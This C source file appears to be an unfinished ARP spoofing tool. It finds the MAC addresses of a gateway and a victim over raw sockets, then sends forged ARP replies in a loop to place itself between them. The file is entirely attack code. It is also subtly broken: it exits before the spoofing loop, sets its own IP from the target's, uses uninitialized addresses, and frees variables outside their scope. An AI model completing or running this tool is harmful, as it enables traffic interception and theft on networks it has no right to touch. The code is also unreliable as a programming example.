#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <sys/socket.h>
#include <net/ethernet.h>
#include <netinet/ip.h>
#include <linux/if_arp.h>
#include <errno.h>
#include "headers.h"
#include "inject_new.h"
#include "utils.h"

int initialize_inject(const char *gateway_ip, char *target_ip, char *own_ip, const char *own_mac, char *ifname) {
    
    uint32_t my_ip;
    uint8_t my_mac[6];
    char *interface = ifname;
    uint32_t target_ip_one;
    uint32_t target_ip_two;

    printf("Initializing inject\n");
    
    // Convert IP address strings to numerical form
    printf("Target IP one: %s\n", gateway_ip);
    printf("Target IP two: %s\n", target_ip);
    
    target_ip_one = (uint32_t)inet_addr(gateway_ip);
    target_ip_two = (uint32_t)inet_addr(target_ip);
    my_ip = (uint32_t)inet_addr(target_ip);

    if (target_ip_one == -1 || target_ip_two == -1 || my_ip == -1) {
        perror("inet_addr() returned an error: ");
        exit(1);
    }
    // Convert own mac to numerical form
    str_to_mac(own_mac, my_mac);
    
    printf("finding MAC addresses of targets\n");
    
    uint8_t mac_addr_one[6];
    uint8_t mac_addr_two[6];
    
    // Given the two IP addresses, find out the MAC addresses   
    get_mac_addr(target_ip_two, my_ip, my_mac, interface, mac_addr_two);
    
    printf("MAC addresses found: %02x:%02x:%02x:%02x:%02x:%02x\n", 
            mac_addr_two[0], mac_addr_two[1], mac_addr_two[2], mac_addr_two[3],
            mac_addr_two[4], mac_addr_two[5]);
    
    get_mac_addr(target_ip_one, my_ip, my_mac, interface, mac_addr_one);
   
    printf("MAC addresses found: %02x:%02x:%02x:%02x:%02x:%02x\n", 
            mac_addr_one[0], mac_addr_one[1], mac_addr_one[2], mac_addr_one[3],
            mac_addr_one[4], mac_addr_one[5]);
    

    // Construct ARP Packets for spoofing
    


    // Start the spoofing and analyze packets    

    printf("Starting spoofing\n");
    exit(1);
    uint32_t target_one_ip;
    uint32_t target_two_ip;
    
    // 1 = broadcast, 0 = spoof 
    int spoof = 0;
    while (1) {
        send_packet(target_one_ip, my_ip, my_mac, ifname, mac_addr_one, spoof);
        send_packet(target_two_ip, my_ip, my_mac, ifname, mac_addr_two, spoof); 
        sleep(2);
    }    
    return 0;
}

int send_packet(uint32_t target_ip, uint32_t own_ip, uint8_t *own_mac, char *ifname, 
                 uint8_t *mac_addr, int get_mac_addr) {
    
    struct arp_header *arp_hdr;
    if (!(arp_hdr = malloc(sizeof(struct arp_header)))) {
        perror("Error in malloc");
        exit(1);
    }
    
    struct ethernet_header *eth_hdr;
    if (!(eth_hdr = malloc(IP_MAXPACKET))) {
        perror("Error in malloc");
        exit(1);
    }
    
    arp_hdr->hardware_type = htons(1);
    arp_hdr->protocol_type = htons(ETH_P_IP);
    arp_hdr->hardware_size = 6;
    arp_hdr->protocol_size = 4;
    arp_hdr->opcode = htons(ARPOP_REPLY);         // ARP_REQUEST = 1, ARP_REPLY = 2
    
    memcpy(arp_hdr->sha, own_mac, 6);
    memcpy(arp_hdr->spa, &own_ip, 4);
    memcpy(arp_hdr->tpa, &target_ip, 4);
    
    uint8_t broadcast_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    
    // Set depending on get_mac_addr value
    if (get_mac_addr) {
        memset(arp_hdr->tha, 0, 6);
        memcpy(&eth_hdr->daddr, broadcast_mac, 6);
    } else {
        memset(arp_hdr->tha, target_ip, 6);
        memcpy(&eth_hdr->daddr, mac_addr, 6);
    }

    memcpy(&eth_hdr->saddr, own_mac, 6);
    memcpy(&eth_hdr->ether_type, (uint8_t[2]){ETH_P_ARP / 256, ETH_P_ARP % 256}, 2); // 0x0806 ARP
    memcpy((uint8_t *)eth_hdr + ETH_HDR_LEN, arp_hdr, ARP_HDR_LEN);

    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sock == -1) {
        perror("Error: socket()");
        exit(1);
    }
    
    struct sockaddr_ll device;
    memset(&device, 0, sizeof(device));
    device.sll_ifindex = if_nametoindex(ifname);
    if (!device.sll_ifindex) {
        perror("Coudn't find index for interface");
        exit(1);
    }
    
    int bytes_sent = sendto(sock, eth_hdr, (ETH_HDR_LEN + ARP_HDR_LEN), 0, (const struct sockaddr *)&device, sizeof(device));
    if (bytes_sent < 0) {
        perror("sendto() failed");
        exit(1);
    }
    
    if (get_mac_addr) {
        return sock;
    }
    close(sock);
    free(eth_hdr);
    free(arp_hdr);
    return -1;
}


void get_mac_addr(uint32_t target_ip, uint32_t own_ip, uint8_t *own_mac, char *ifname, uint8_t *mac_addr) {
    
    int get_mac_addr = 1;
    
    int sock = send_packet(target_ip, own_ip, own_mac, ifname, mac_addr, get_mac_addr);
    
    // For response packet
    char buffer[IP_MAXPACKET];
    struct ethernet_header *eth_res_hdr;
    struct arp_header *arp_res_hdr;
    printf("Listening for response\n");

    while (1) {
        struct arp_header res;
        int bytes_recvd = recvfrom(sock, buffer, IP_MAXPACKET, 0, NULL, NULL);
        if (bytes_recvd < 0) {
            perror("recvfrom() failed");
            exit(1);
        }
        
        eth_res_hdr = (struct ethernet_header *)buffer;
        if (ntohs(eth_res_hdr->ether_type) != ETH_P_ARP)
            continue;
        
        arp_res_hdr = (struct arp_header *)(buffer + ETH_HDR_LEN);
        if (ntohs(arp_res_hdr->opcode) == ARPOP_REPLY) { 
            memcpy(mac_addr, arp_res_hdr->sha, 6);
            close(sock);
            free(eth_hdr);
            free(arp_hdr);
            return;
        }
    }

    perror("Unable to find target MAC addresses");
    exit(1);
}



